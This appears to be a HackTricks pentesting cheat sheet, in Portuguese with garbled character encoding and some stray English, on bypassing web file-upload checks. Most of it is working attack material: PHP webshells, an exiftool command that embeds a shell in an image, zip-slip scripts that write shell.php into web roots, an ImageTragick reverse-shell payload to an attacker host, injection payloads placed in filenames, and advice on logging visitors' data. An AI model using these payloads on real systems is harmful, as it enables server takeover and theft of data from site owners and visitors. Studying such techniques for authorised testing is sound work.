<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Metodologia Geral de Upload de Arquivos

1. Tente fazer o upload de um arquivo com uma **dupla extens√£o** \(ex: _file.png.php_ ou _file.png.php5_\).
* Extens√µes PHP: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* Extens√µes ASP: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. Tente **colocar em mai√∫scula alguma\(s\) letra\(s\) da extens√£o**. Por exemplo: _.pHp, .pHP5, .PhAr ..._
3. Tente fazer o upload de alguma **dupla \(ou mais\) extens√£o** \(√∫til para burlar verifica√ß√µes mal configuradas que testam se uma extens√£o espec√≠fica est√° presente\):
1. _file.png.php_
2. _file.png.txt.php_
4. Tente fazer o upload de alguma **dupla extens√£o invertida** \(√∫til para explorar m√°s configura√ß√µes do Apache onde qualquer coisa com a extens√£o _.php_, mas **n√£o necessariamente terminando em .php**, executar√° c√≥digo\):
* _ex: file.php.png_
5. Dupla extens√£o com **caractere nulo:**
1. _ex: file.php%00.png_
6. **Adicione alguns caracteres especiais no final** da extens√£o_: %00, %20, \(v√°rios pontos\)...._
1. _file.php%00_
2. _file.php%20_
3. _file.php...... --&gt; No Windows, quando um arquivo √© criado com pontos no final, eles ser√£o removidos \(assim voc√™ pode burlar filtros que verificam a extens√£o .php\)
4. _file.php/_
5. _file.php.\_
7. Bypass em verifica√ß√µes de Content-Type definindo o **valor** do **header Content-Type** para: _image/png_, _text/plain_, application/octet-stream_
8. Bypass na verifica√ß√£o de magic number adicionando no in√≠cio do arquivo os **bytes de uma imagem real** \(confundir o comando _file_\). Ou introduza o shell nos **metadados**: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
1. Tamb√©m √© poss√≠vel que os **bytes m√°gicos** estejam sendo apenas **verificados** no arquivo e voc√™ pode defini-los **em qualquer lugar do arquivo**.
9. Usando **fluxo de dados alternativo NTFS \(ADS\)** no **Windows**. Nesse caso, um caractere de dois pontos ":" ser√° inserido ap√≥s uma extens√£o proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extens√£o proibida** ser√° criado no servidor \(por exemplo, "file.asax:.jpg"\). Esse arquivo pode ser editado posteriormente usando outras t√©cnicas, como usar seu nome curto. O padr√£o "**::$data**" tamb√©m pode ser usado para criar arquivos n√£o vazios. Portanto, adicionar um caractere de ponto ap√≥s esse padr√£o tamb√©m pode ser √∫til para burlar restri√ß√µes adicionais \(por exemplo, "file.asp::$data."\)
10. **Fa√ßa o upload** da backdoor com uma **extens√£o permitida** \(_png_\) e tor√ßa por uma **m√° configura√ß√£o** que execute a backdoor
11. Encontre uma vulnerabilidade para **renomear** o arquivo j√° enviado \(para alterar a extens√£o\).
12. Encontre uma vulnerabilidade de **Inclus√£o de Arquivo Local** para executar a backdoor.
13. **Poss√≠vel divulga√ß√£o de informa√ß√µes**:
1. Fa√ßa o upload **v√°rias vezes** \(e ao **mesmo tempo**\) do **mesmo arquivo** com o **mesmo nome**
2. Fa√ßa o upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **j√° existe**
3. Fa√ßa o upload de um arquivo com **‚Äú.‚Äù, ‚Äú..‚Äù, ou ‚Äú‚Ä¶‚Äù como seu nome**. Por exemplo, no Apache no **Windows**, se a aplica√ß√£o salvar os arquivos enviados no diret√≥rio ‚Äú/www/uploads/‚Äù, o nome de arquivo ‚Äú.‚Äù criar√° um arquivo chamado ‚Äúuploads‚Äù no diret√≥rio ‚Äú/www/‚Äù.
4. Fa√ßa o upload de um arquivo que n√£o possa ser facilmente exclu√≠do, como **‚Äú‚Ä¶:.jpg‚Äù** no **NTFS**. \(Windows\)
5. Fa√ßa o upload de um arquivo no **Windows** com **caracteres inv√°lidos** como `|<>*?‚Äù` em seu nome. \(Windows\)
6. Fa√ßa o upload de um arquivo no **Windows** usando **nomes reservados** \(**proibidos**\) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 e LPT9.

Tente tamb√©m **fazer o upload de um execut√°vel** \(.exe\) ou um **.html** \(menos suspeito\) que **executar√° c√≥digo** quando aberto acidentalmente pela v√≠tima.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files" %}

Se voc√™ est√° tentando fazer o upload de arquivos para um servidor **PHP**, [d√™ uma olhada no truque do **.htaccess** para executar c√≥digo](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).
Se voc√™ est√° tentando fazer o upload de arquivos para um servidor **ASP**, [d√™ uma olhada no truque do **.config** para executar c√≥digo](../pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).
Os arquivos `.phar` s√£o como os arquivos `.jar` para Java, mas para PHP, e podem ser **usados como um arquivo PHP** (executando-o com o PHP ou incluindo-o em um script...).

A extens√£o `.inc` √© √†s vezes usada para arquivos PHP que s√£o apenas usados para **importar arquivos**, ent√£o, em algum momento, algu√©m pode ter permitido **a execu√ß√£o dessa extens√£o**.

**Verifique muitas poss√≠veis vulnerabilidades de upload de arquivos com o plugin BurpSuit** [**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **ou use um aplicativo de console que encontra quais arquivos podem ser enviados e tenta diferentes truques para executar c√≥digo:** [**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **Truque de Upload de Arquivo/SSRF com wget**

Em algumas ocasi√µes, voc√™ pode descobrir que um servidor est√° usando o **`wget`** para **baixar arquivos** e voc√™ pode **indicar** a **URL**. Nestes casos, o c√≥digo pode estar verificando se a extens√£o dos arquivos baixados est√° em uma lista branca para garantir que apenas arquivos permitidos ser√£o baixados. No entanto, **essa verifica√ß√£o pode ser contornada**.
O **comprimento m√°ximo** de um **nome de arquivo** no **Linux** √© **255**, no entanto, o **wget** trunca os nomes de arquivo para **236** caracteres. Voc√™ pode **baixar um arquivo chamado "A"\*232+".php"+".gif"**, este nome de arquivo ir√° **burlar** a **verifica√ß√£o** (como neste exemplo **".gif"** √© uma extens√£o **v√°lida**), mas o `wget` ir√° **renomear** o arquivo para **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Observe que **outra op√ß√£o** que voc√™ pode estar pensando para contornar essa verifica√ß√£o √© fazer com que o **servidor HTTP redirecione para um arquivo diferente**, para que a URL inicial contorne a verifica√ß√£o e, em seguida, o wget fa√ßa o download do arquivo redirecionado com o novo nome. Isso **n√£o funcionar√°** **a menos que** o wget esteja sendo usado com o **par√¢metro** `--trust-server-names`, porque o wget far√° o download da p√°gina redirecionada com o nome do arquivo indicado na URL original.

# Da transfer√™ncia de arquivos para outras vulnerabilidades

* Defina o **nome do arquivo** como `../../../tmp/lol.png` e tente obter uma **travessia de diret√≥rio**
* Defina o **nome do arquivo** como `sleep(10)-- -.jpg` e voc√™ pode conseguir uma **inje√ß√£o de SQL**
* Defina o **nome do arquivo** como `<svg onload=alert(document.comain)>` para obter um XSS
* Defina o **nome do arquivo** como `; sleep 10;` para testar alguma inje√ß√£o de comando \(mais [trapa√ßas de inje√ß√£o de comando aqui](command-injection.md)\)
* [**XSS** em upload de arquivo de imagem \(svg\)](xss-cross-site-scripting/#xss-uploading-files-svg)
* Upload de arquivo **JS** + **XSS** = [explora√ß√£o de **Service Workers**](xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE em upload de svg**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirecionamento aberto** atrav√©s do upload de arquivo svg](open-redirect.md#open-redirect-uploading-svg-files)
* [Famosa vulnerabilidade de **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Se voc√™ puder **indicar ao servidor web para capturar uma imagem de uma URL**, voc√™ pode tentar abusar de um [SSRF](ssrf-server-side-request-forgery.md). Se essa **imagem** for ser **salva** em algum site **p√∫blico**, voc√™ tamb√©m pode indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informa√ß√µes de todos os visitantes**.

Aqui est√° uma lista dos 10 principais itens que voc√™ pode alcan√ßar fazendo upload \(de [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)\):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS armazenado / SSRF / XXE
3. **GIF**: XSS armazenado / SSRF
4. **CSV**: Inje√ß√£o de CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: Inje√ß√£o de HTML / XSS / Redirecionamento aberto
8. **PNG / JPEG**: Ataque de inunda√ß√£o de pixels \(DoS\)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / XXE cego

# Upload de arquivo ZIP descompactado automaticamente

Se voc√™ puder fazer upload de um arquivo ZIP que ser√° descompactado dentro do servidor, voc√™ pode fazer 2 coisas:

## Symlink

Fa√ßa o upload de um link contendo links simb√≥licos para outros arquivos e, em seguida, ao acessar os arquivos descompactados, voc√™ acessar√° os arquivos vinculados:
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## Descompactar em pastas diferentes

Os arquivos descompactados ser√£o criados em pastas inesperadas.

Pode-se facilmente assumir que essa configura√ß√£o protege contra a execu√ß√£o de comandos em n√≠vel de sistema operacional por meio de uploads maliciosos de arquivos, mas infelizmente isso n√£o √© verdade. Como o formato de arquivo ZIP suporta compress√£o hier√°rquica e tamb√©m podemos fazer refer√™ncia a diret√≥rios de n√≠veis superiores, podemos escapar do diret√≥rio seguro de upload abusando da funcionalidade de descompacta√ß√£o do aplicativo alvo.

Um exploit automatizado para criar esse tipo de arquivo pode ser encontrado aqui: [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
```python
import zipfile

def create_malicious_zip(file_path, payload):
    with zipfile.ZipFile(file_path, 'w') as zip_file:
        zip_file.writestr('../payload.php', payload)

file_path = 'malicious.zip'
payload = '<?php system($_GET["cmd"]); ?>'

create_malicious_zip(file_path, payload)
```

This Python code creates a malicious ZIP file by using the `zipfile` module. The `create_malicious_zip` function takes two parameters: `file_path` and `payload`. 

Inside the function, a ZIP file is created using the `zipfile.ZipFile` constructor. The `writestr` method is then used to add a file named `../payload.php` to the ZIP file, with the contents being the `payload` provided.

The `file_path` variable specifies the name and path of the resulting malicious ZIP file, while the `payload` variable contains the PHP code that will be executed when the `payload.php` file is accessed.

To use this code, simply call the `create_malicious_zip` function with the desired `file_path` and `payload` values.
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Para obter a execu√ß√£o remota de comandos, segui os seguintes passos:

1. Criar um shell PHP:
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. Use "file spraying" and create a compressed zip file:

2. Use a t√©cnica de "file spraying" e crie um arquivo zip compactado:
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. Use um hexeditor ou vi e altere "xxA" para "../", eu usei vi:
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
Apenas um passo restou: Fa√ßa o upload do arquivo ZIP e permita que a aplica√ß√£o o descompacte! Se tiver sucesso e o servidor web tiver privil√©gios suficientes para gravar nos diret√≥rios, haver√° um shell simples de execu√ß√£o de comandos do sistema:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**Refer√™ncia**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## Descompactar com um nome diferente

√Äs vezes, uma aplica√ß√£o bloquear√° o carregamento de um arquivo verificando sua extens√£o dentro do arquivo zip. Se essa verifica√ß√£o for superficial, ou seja, verificando o nome do arquivo dentro do cabe√ßalho do campo local, ela pode ser contornada fazendo com que a aplica√ß√£o acredite que o arquivo tenha essa extens√£o, enquanto ter√° outra quando descompactado.

Podemos reutilizar o script anterior para criar um arquivo zip.
```python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('shell.php .pdf', '<?php echo system($_REQUEST["cmd"]); ?>')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Observe que o nome cont√©m um espa√ßo. Agora voc√™ pode editar o arquivo zip gerado com um editor hexadecimal e alterar esse caractere no campo nome localizado dentro do Cabe√ßalho do Diret√≥rio Central para um byte nulo `00`:
```bash
# before changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 202e 7064  ...shell.php .pd
# after changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 002e 7064  ...shell.php..pd
```
Quando a aplica√ß√£o verificar√° o nome do arquivo dentro do zip, o nome usado para essa verifica√ß√£o ser√° o nome do cabe√ßalho do arquivo local, **mas n√£o se o zip estiver criptografado** (consulte a especifica√ß√£o pkzip). O nome usado para armazenar o arquivo ser√° o nome do cabe√ßalho do diret√≥rio central quando o 7z ou unzip perceberem uma diferen√ßa entre os dois nomes. Gra√ßas ao byte nulo, o nome ser√° `shell.php`.

Quando descompactado:
```bash
7z e poc.zip
ls
shell.php
```
**Refer√™ncias**:

[https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)

[https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)

# ImageTragic

Fa√ßa o upload deste conte√∫do com uma extens√£o de imagem para explorar a vulnerabilidade **\(ImageMagick, 7.0.1-1\)**.
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# Incorporando um Shell PHP em PGN

A principal raz√£o para colocar um shell web no chunk IDAT √© que ele tem a capacidade de contornar opera√ß√µes de redimensionamento e reamostragem - o PHP-GD cont√©m duas fun√ß√µes para isso [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) e [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Leia este post: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# Arquivos Poliglotas

Poliglotas, em um contexto de seguran√ßa, s√£o arquivos que s√£o uma forma v√°lida de v√°rios tipos diferentes de arquivos. Por exemplo, um [GIFAR](https://en.wikipedia.org/wiki/Gifar) √© tanto um arquivo GIF quanto um arquivo RAR. Existem tamb√©m arquivos que podem ser tanto GIF quanto JS, tanto PPT quanto JS, etc.

Arquivos poliglotas s√£o frequentemente usados para contornar prote√ß√µes baseadas em tipos de arquivo. Muitos aplicativos que permitem que os usu√°rios fa√ßam upload de arquivos s√≥ permitem uploads de certos tipos, como JPEG, GIF, DOC, para evitar que os usu√°rios fa√ßam upload de arquivos potencialmente perigosos como arquivos JS, arquivos PHP ou arquivos Phar.

Isso ajuda a fazer upload de um arquivo que est√° em conformidade com o formato de v√°rios formatos diferentes. Isso permite que voc√™ fa√ßa upload de um arquivo PHAR (PHp ARchive) que tamb√©m parece um JPEG, mas provavelmente voc√™ ainda precisar√° de uma extens√£o v√°lida e se a fun√ß√£o de upload n√£o permitir isso, isso n√£o ajudar√° voc√™.

Mais informa√ß√µes em: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
